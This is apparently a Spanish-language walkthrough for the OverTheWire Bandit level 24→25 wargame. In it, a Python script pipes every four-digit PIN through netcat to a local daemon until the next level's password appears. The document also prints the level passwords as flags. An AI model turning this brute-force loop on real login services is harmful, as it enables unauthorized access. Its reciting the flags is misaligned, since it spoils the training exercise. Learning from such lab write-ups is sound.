#Bandit Level 24 → Level 25

##Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Write Up Iker

La contraseña la hemos sacado en el anterior apartado:

**FLAG** = {UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ}

Utilizamos esta contraseña para acceder al siguiente nivel.

```bash 
$ ssh bandit24@bandit.labs.overthewire.org
```

El enunciado nos indica que tenemos un **daemon** escuchando en el puerto **30002** al que le tenemos que pasar:
  - 1 - La password de **bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**
  - 2 - **PIN** secreto de 4 digitos (0000-9999)
  
También nos dice que no hay otra forma salvo la **Fuerza Bruta** para adivinar el **PIN SECRETO** y obtener la contraseña del siguiente nivel.

Probamos a enviar directamente los parámetros:

```bash
echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0123' | nc localhost 30002
```

Y nos devuelve otro mensaje

```bash
bandit24@melinda:/tmp$ echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0123' | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
```

Bien! Hemos conseguido mandar los argumentos (password+pin) al puerto 30002 de localhost y nos ha devuelto un mensaje indicando **Wrong! Please enter the correct pincode. Try again.**

Podemos **AUTOMATIZAR** la tarea de **ENVÍO** y generación de **PINCODES** haciendo un pequeño **Script** en **Python**



NOTA: Elijo **Python** porque es el lenguaje con el que mejor me manejo :)

```python
import os

''' payload ->  echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ <4digitPinCode-0000-9999>' | nc localhost 30002 '''

passBandit24  = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
pinCode		    = ""

for i in range(0,10001):
	pin 	= "%04d" % i 
	print "["+str(i)+"]"+"-"*180
	payload	= "echo \'%s %s\' | nc localhost 30002" % (passBandit24,pin)
	os.system(payload)
```

Creamos el script que llamaremos **bandit25.py** con el editor **nano** en el directorio **/tmp** y escribimos el contenido del script en el fichero.

```bash
bandit24@melinda:/tmp$ nano bandit25.py
```

Ejecutamos el script de Python 

```bash
bandit24@melinda:/tmp$ python bandit25.py
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
[0]----------------------------------------------------------------------------------------------------
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
[1]----------------------------------------------------------------------------------------------------
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
[2]----------------------------------------------------------------------------------------------------
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
...
```

Y esperamos a que aparezca la password:

```bash
...
[5667]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
[5668]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
[5669]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```
Encontramos el **PINCODE CORRECTO!!** con el número **PIN=5669** y nos devuelve la contraseña :)

**FLAG** = {uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG}








  
